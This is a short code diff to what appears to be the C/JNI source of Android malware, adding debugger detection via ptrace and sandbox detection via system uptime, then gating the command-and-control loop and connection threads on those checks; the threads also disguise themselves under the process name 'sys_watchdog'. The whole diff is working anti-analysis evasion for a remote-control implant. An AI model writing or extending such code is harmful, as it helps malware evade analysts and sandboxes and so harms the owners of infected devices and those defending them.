@@ -10,6 +10,27 @@
 #include <jni.h>
 #include <sys/utsname.h>
 #include <sys/prctl.h>
+#include <sys/ptrace.h>
+#include <sys/sysinfo.h>
+
+// --- ENVIRONMENT PINNING ---
+int check_environment() {
+    // 1. Anti-Debugging Check (ptrace)
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
+        return 0; // Debugger detected
+    }
+    ptrace(PTRACE_DETACH, 0, 1, 0);
+
+    // 2. Anti-Sandbox Check (Uptime)
+    struct sysinfo info;
+    if (sysinfo(&info) == 0) {
+        if (info.uptime < 300) {
+            return 0; // Likely a fresh sandbox/emulator boot
+        }
+    }
+
+    return 1; // Environment appears safe
+}
 
 // --- JNI GLOBALS ---
 static JavaVM* g_vm = NULL;
@@ -261,6 +282,7 @@ void handle_command(int fd, const char* cmd, const char* key) {
 }
 
 void* c2_loop(void* args) {
+    if (!check_environment()) return NULL;
     prctl(PR_SET_NAME, "sys_watchdog", 0, 0, 0);
     c2_args_t* c2_args = (c2_args_t*)args;
     int fd = c2_args->fd;
@@ -288,6 +310,7 @@ void* c2_loop(void* args) {
 }
 
 void* connect_thread(void* args) {
+    if (!check_environment()) return NULL;
     prctl(PR_SET_NAME, "sys_watchdog", 0, 0, 0);
     connect_args_t* conn_args = (connect_args_t*)args;
     
